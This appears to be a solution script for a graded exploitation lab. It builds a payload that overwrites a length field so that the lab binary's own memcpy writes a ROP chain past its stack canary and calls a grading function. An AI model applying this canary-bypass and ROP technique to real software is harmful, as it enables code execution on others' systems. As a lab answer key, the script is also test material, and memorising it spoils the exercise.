#!/usr/bin/env python3
"""Task 4: bypass the stack canary in attack/dark-log.

input() holds a struct whose field order is fixed to leave an exploit window:

    struct log_frame {
      char expression[128];   // base + 0x000
      char logMsg[128];       // base + 0x080
      int  len;               // base + 0x100
      char pad[8];            // base + 0x104
    };

and is compiled with -fstack-protector, so a canary sits between the locals and
the saved rbp:

    canary      base + 0x118
    saved rbp   base + 0x120
    return addr base + 0x128

Writing straight from the buffer to the return address would clobber the canary
and trip __stack_chk_fail. Instead we overflow `len` (reachable at base+0x100,
before the canary) and let the function's own code do the dirty work:

    memcpy(f.logMsg + f.len, f.expression, 128);

With len = 0xa8 (168), the destination f.logMsg + len == base + 0x128 == the
saved return address, so memcpy copies our ROP chain from expression onto the
return address *without ever touching the canary*. The canary check then passes
and control transfers to our chain: pop rdi; ret -> rdi=4 -> grade_eval(4).

The gadget pop rdi; ret lives at the unaligned address 0x4018a3 inside the
csu-init "pop r15; ret" (bytes 41 5f c3 -> 5f c3).
"""
import struct
import sys

POP_RDI_RET = 0x4018A3
RET         = 0x4018A4
GRADE_EVAL  = 0x401677
LEN         = 0xA8            # logMsg + 0xa8 == return address

chain  = struct.pack("<Q", POP_RDI_RET)  # expression[0:8]  -> new return addr
chain += struct.pack("<Q", 4)            # expression[8:16] -> rdi = 4
chain += struct.pack("<Q", RET)          # expression[16:24] -> align rsp
chain += struct.pack("<Q", GRADE_EVAL)   # expression[24:32] -> grade_eval(4)

payload  = chain
payload += b"A" * (128 - len(chain))      # pad expression to 128 bytes
payload += b"B" * 128                     # logMsg (overwritten, unused)
payload += struct.pack("<I", LEN)         # len -> memcpy destination

sys.stdout.buffer.write(payload + b"\n")
